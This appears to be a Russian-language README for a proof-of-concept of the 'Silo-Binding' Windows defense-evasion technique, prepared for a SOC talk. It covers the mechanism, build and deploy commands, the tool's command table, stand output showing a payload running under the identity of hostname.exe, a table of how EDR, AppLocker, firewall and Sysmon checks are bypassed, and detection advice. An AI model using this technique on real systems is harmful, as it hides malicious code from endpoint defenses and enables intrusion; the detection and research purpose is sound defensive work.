# Silo-Binding PoC

Рабочий PoC техники **Silo-Binding** — одного из трёх вариантов злоупотребления
Bind Links (File-Binding / Process-Binding / Silo-Binding), описанных Bitdefender
Labs в материале
[«Bind Link Abuse: One Windows Feature, Many Ways to Blind Your EDR»](https://businessinsights.bitdefender.com/bind-link-abuses-windows-feature-edr-evasion-technique)
(15.07.2026).

Доклад для SOC-форума использует эту технику как пример того, что **путь к файлу —
не идентичность**. PoC подтверждает механизм на живом стенде: код злоумышленника
исполняется внутри Windows *silo* под именем доверенного системного процесса, а
любой инструмент снаружи (антивирус, AppLocker, правила фаервола по пути, Sysmon,
перехеширование при повторном открытии) видит чистый легитимный файл.

> Требуются права локального администратора. Уязвимого драйвера не нужно —
> используется документированная возможность ОС. Только для авторизованных
> исследований и лабораторных стендов.

---

## 1. Идея механизма

Silo-Binding — это **два противоположных Bind Link** поверх одной и той же пары
файлов плюс граница изоляции (silo), из-за которой один и тот же путь резолвится
по-разному внутри и снаружи.

```
        ВНУТРИ silo                                СНАРУЖИ silo
   ┌───────────────────────┐                 ┌───────────────────────┐
   │  trusted.exe          │                 │  payload.exe          │
   │      │ silo-link       │                 │      │ global-link    │
   │      ▼                 │                 │      ▼                │
   │  payload.exe  (бежит)  │                 │  trusted.exe  (чистый)│
   └───────────────────────┘                 └───────────────────────┘
```

1. **Silo-scoped link**: `trusted.exe  ->  payload.exe` (флаг
   `BINDFLT_FLAG_USE_CURRENT_SILO_MAPPING` + handle silo). Виден только процессам
   внутри silo.
2. **Inverse global link**: `payload.exe  ->  trusted.exe` (обычный глобальный
   линк). Виден всем остальным.

Процесс, запущенный **изнутри** silo как `trusted.exe`, реально исполняет
`payload.exe`. При этом ядро в отчётности о создании процесса отдаёт
`trusted.exe`, а любой инструмент, который **снаружи** откроет `payload.exe`
(перехеширует, пересканирует, проверит политикой), будет молча перенаправлен на
чистый `trusted.exe`.

Ключевой нюанс, который пришлось учесть в реализации (см. §7): образ процесса
резолвится в контексте **родителя**. Поэтому запуск делается в две ступени —
сначала в silo попадает «лаунчер», уже оттуда он порождает доверенное имя.

---

## 2. Состав проекта

```
silo-binding/
├── include/bindflt.h      # структуры/константы bindflt.sys и сигнатуры API
├── src/silobind.cpp       # сам PoC (link/unlink/dump/run/runj/read/demo)
├── src/payload.cpp        # «призрак»: код, исполняемый под чужим именем
├── build.sh               # кросс-сборка через zig (Windows x64)
├── deploy.sh              # заливка на VM по SMB + запуск через guestcontrol
├── run-demo.bat           # запуск demo прямо на VM
└── README.md
```

Интерфейс `bindfltapi.dll` (`BfSetupFilter` / `BfRemoveMapping` / `BfGetMappings`)
резолвится динамически, поэтому отдельные импорт-библиотеки не нужны. Есть
резервный путь через «сырой» порт `\BindFltPort` (`--raw`), но он валидирован
Bitdefender только на Windows 11 (22000–26200) и на Windows 10 19045 не работает
(см. §7).

---

## 3. Сборка

Нужен только [zig](https://ziglang.org) — он тащит заголовки и библиотеки mingw-w64:

```bash
cd silo-binding
./build.sh          # -> out/silobind.exe, out/payload.exe
```

(Эквивалент: `zig c++ -target x86_64-windows-gnu -O2 -std=gnu++17 -Iinclude src/silobind.cpp -lshell32`.)

---

## 4. Развёртывание и запуск на стенде

Стенд: VirtualBox-VM `Windows10Kasper` (Windows 10 22H2, build 19045) с
установленным **Kaspersky Premium**; управление — `VBoxManage guestcontrol`, файлы —
через SMB (`C$`), админ `Administrator`.

```bash
# залить и сразу прогнать demo
VM=Windows10Kasper VMHOST=192.168.56.10 VMUSER=Administrator VMPASS='Passw0rd!' \
    ./deploy.sh demo
```

Либо на самой VM: `run-demo.bat`.

### Команды PoC

| команда | смысл |
|---|---|
| `silobind.exe demo [trusted] [payload] [silo]` | полный сценарий Silo-Binding (по умолчанию `hostname.exe` → `payload.exe`, silo `silo-ghost`) |
| `silobind.exe link <virtRoot> <backing> [silo]` | создать линк (silo-scoped, если указан silo) |
| `silobind.exe unlink <virtRoot> [silo]` | удалить линк |
| `silobind.exe dump [silo]` | перечислить активные маппинги (глобальные/в silo) |
| `silobind.exe run <cmd...>` / `runj <silo> <cmd...>` | запуск снаружи / внутри silo |
| `silobind.exe read <path>` | размер + хеш + финальный путь файла |
| `--raw` | принудительно сырой интерфейс `\BindFltPort` |

> **Важно:** silo живёт, пока какой-то процесс держит handle его job-объекта.
> Поэтому весь сценарий должен выполняться **в одном процессе** (команда `demo`),
> а не набором отдельных вызовов.

---

## 5. Что наблюдаем (реальный вывод со стенда)

```
==================== Silo-Binding PoC ====================
  trusted (allowed) : C:\Windows\System32\hostname.exe
  payload (blocked) : C:\ProgramData\silobind\payload.exe
  silo              : silo-ghost
  interface         : bindfltapi.dll
==========================================================

[baseline] trusted  14848 bytes  hash=2f3478b466c88782
[baseline] payload  189440 bytes  hash=60a122bdb8cad8e5

[+] silo ready
[+] silo link    : C:\Windows\System32\hostname.exe -> C:\ProgramData\silobind\payload.exe   (inside only)
[+] global link  : C:\ProgramData\silobind\payload.exe -> C:\Windows\System32\hostname.exe   (everywhere else)

--- identity as seen by a tool OUTSIDE the silo ---
  open  C:\ProgramData\silobind\payload.exe
        size=14848 hash=2f3478b466c88782  final=\\?\C:\ProgramData\silobind\payload.exe
        -> redirected to the TRUSTED file (clean)
  open  C:\Windows\System32\hostname.exe
        size=14848 hash=2f3478b466c88782  -> real trusted file (silo link invisible outside)

--- identity as seen by a tool INSIDE the silo ---
  HASH|189440|60a122bdb8cad8e5|\?\C:\Windows\System32\HOSTNAME.EXE|C:\Windows\System32\hostname.exe
        -> inside, the trusted path resolves to the PAYLOAD

--- execution: launching "C:\Windows\System32\hostname.exe" inside the silo ---

  +------------------------------------------------------+
  |        SILOBIND PAYLOAD EXECUTED (the ghost)         |
  +------------------------------------------------------+
    GetModuleFileNameW : C:\Windows\System32\hostname.exe
    GetCommandLineW    : C:\Windows\System32\hostname.exe C:\ProgramData\silobind\pwned.txt
    PID                : 5220
    marker written     : C:\ProgramData\silobind\pwned.txt
  +------------------------------------------------------+

[exit=0]
  marker file created: YES

--- active mappings (what a defender can enumerate) ---
[*] global mappings: 2
      [0] \Device\HarddiskVolume2\ProgramData\silobind\payload.exe
           -> \Device\HarddiskVolume2\Windows\System32\HOSTNAME.EXE
[*] silo mappings: 1
      [0] \Device\HarddiskVolume2\Windows\System32\HOSTNAME.EXE
           -> \Device\HarddiskVolume2\ProgramData\silobind\payload.exe

[*] links removed, silo closed.
```

Ключевой момент — **`GetModuleFileNameW` возвращает доверенный путь
`hostname.exe`, хотя исполняется наш код**. Это и есть подмена идентичности.

Дополнительно, «глазами» инструмента перехеширования (`certutil` = стенд-ин для
повторного открытия файла антивирусом/Sysmon):

```
payload.exe ДО линка   : 349b5bbd25b25c5b96d67ea4de1487c54b1359e12a959a012e0f0c2172dc76d5
payload.exe ПОСЛЕ линка: a90c3fb350a11c6f6a6efa9607987d924d1de65e09ca9faf2e0e0e00531ee335
hostname.exe           : a90c3fb350a11c6f6a6efa9607987d924d1de65e09ca9faf2e0e0e00531ee335
```

Хеш `payload.exe` «снаружи» стал равен хешу `hostname.exe`.

---

## 6. Почему это ломает защиту (по статье)

| Что защищается | Как Silo-Binding это обходит |
|---|---|
| **EDR** | образ процесса и повторно открываемый файл отдаются как доверенные; код исполняется, но телеметрия по пути чистая |
| **AppLocker** | решение принимается по имени/пути/хешу `trusted.exe`, а исполняется `payload.exe` |
| **Windows Firewall (правила по процессу)** | идентичность процесса для правила — `trusted.exe`, которому «можно» в сеть |
| **Sysmon (хеши)** | хеш считается снаружи и указывает на чистый файл; охота по хешу `payload.exe` ничего не находит |
| **Перехеширование / async-скан** | повторное открытие пути возвращает другой файл, чем тот, что исполнялся |

---

## 7. Ограничения и грабли стенда

- **Нужны права администратора** (создание silo и bind-линков).
- **Silo умирает вместе с процессом**, который держит его job handle
  (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) → сценарий выполняется одним процессом.
- **Образ резолвится в контексте родителя.** Запуск `CreateProcess` с
  `PROC_THREAD_ATTRIBUTE_JOB_LIST` не применяет silo-маппинг к самому образу —
  поэтому запуск двухступенчатый (лаунчер в silo → он порождает доверенное имя).
- **Раскладка ответа `BfGetMappings` зависит от сборки.** На Windows 10 19045
  запись компактнее (2×`UINT16` длины + 2×`UINT32` смещения, 12 байт), на Windows 11
  RS5+ — 20 байт (5×`UINT32`). Парсер в PoC определяет формат автоматически.
- **Сырой `\BindFltPort` на 19045 не работает** (проверено: `0xD000000D`) — путь
  `bindfltapi.dll` надёжен. `--raw` оставлен как резерв, валидированный Bitdefender
  на 22000–26200.
- **Veto-механизм отсутствует на 19045** (появился в 24H2 и, по статье, это лишь
  частичная мера: только boot-раздел, только создание, не для silo-линков).
- **Kaspersky Premium на стенде не помешал** демонстрации: снаружи он видит
  доверенный процесс и чистый файл.
- `VBoxManage guestcontrol` иногда теряет stdout процесса
  (`VERR_NOT_IMPLEMENTED`) — в хелпере вывод пишется в файл и читается по SMB.

---

## 8. Обнаружение (для SOC / detection engineering)

Прямо из рекомендаций статьи, адаптировано под слайд «Bind Links: защита»:

1. **Не доверять image-path** из process-creation callback. Резолвить реальный
   backing-файл (`PsReferenceProcessFilePointer`, `IoGetShadowFileInformation`),
   и принимать решения (allowlist, хеш, подпись, firewall/DLP по идентичности)
   по нему.
2. **Перерезолвить идентичность при каждом отложенном повторном открытии**
   (хеширование, async-скан, лечение) — один и тот же путь не обязан дважды
   возвращать один файл.
3. **Перечислять активные bind-маппинги**, включая silo-scoped (создание которых
   не видно через creation-callbacks). В PoC это `silobind.exe dump`.
4. **Следить за появлением/загрузкой `bindflt.sys` и аномалиями вокруг защищаемых
   путей**; учитывать, что veto частичный и версионно-зависимый.
5. Ограничивать локальный admin; включать tamper protection; держать свои файлы на
   boot-разделе, чтобы veto был применим.

В терминах MITRE ATT&CK: `T1562.001` (Impair Defenses), `T1574.001/.002`
(Hijack Execution Flow), `T1036.005` (Masquerading), `T1003.002` (credential
dumping под подменённой идентичностью — как в демо статьи с Invoke-Mimikatz).

---

## 9. Источники

- Bitdefender Labs — *Bind Link Abuse: One Windows Feature, Many Ways to Blind Your EDR* (15.07.2026).
- Bitdefender `bindutil-toolset` + whitepaper *Silo Binding — Uncovering the Ghost in the Silo* — https://github.com/bitdefender/bindutil-toolset
- Microsoft Learn — Bind Links / BindFilter API, *Vetoing a Bind Link*, Isolation Modes.
- Quarkslab — *Reversing Windows Container, Episode I: Silo*.

---

## 10. Дисклеймер

Материал предназначен исключительно для образовательных и исследовательских целей
и для проверки защитных средств на авторизованном лабораторном стенде. Техника
опирается только на штатную функциональность ОС и требует административных прав;
это не 0-day и не CVE. Использование в отношении чужих систем без разрешения
противозаконно.
